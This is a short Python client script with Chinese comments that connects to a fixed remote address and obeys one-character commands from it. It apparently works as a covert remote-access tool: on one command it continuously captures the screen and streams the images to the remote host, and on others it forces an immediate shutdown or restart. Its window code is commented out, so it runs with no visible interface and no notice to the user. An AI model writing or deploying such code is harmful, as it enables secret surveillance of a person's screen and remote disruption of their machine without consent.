from socket import *
from PIL import ImageGrab
import os
import tkinter as tk


#GUI界面
'''def root():
    root=tk.Tk()
    root.title('Aydin')
    root.geometry('600x400')
    root.mainloop()
root()'''


s = socket()
s.connect(('192.168.1.7', 8888))

c = s.recv(1024).decode()
if c == '1':
    while True:
        image = ImageGrab.grab()
        image = image.resize((960, 540))
        image.save('1.jpg')
        size = os.path.getsize('1.jpg')
        
        # 发送文件大小（添加长度前缀）
        size_str = str(size)
        s.send(len(size_str).to_bytes(4, 'big'))  # 先发送长度前缀
        s.send(size_str.encode())                 # 再发送实际数据
        
        s.recv(1024)  # 等待确认
        with open('1.jpg', 'rb') as file:
            while True:
                data = file.read(4096)
                if not data:
                    break
                s.send(data)
if c=='2':
    os.system('shutdown -s -t 1')#-s为关机 -t为时间
elif c=='3':
    os .system('shutdown -r -t 1')#-r为重启          


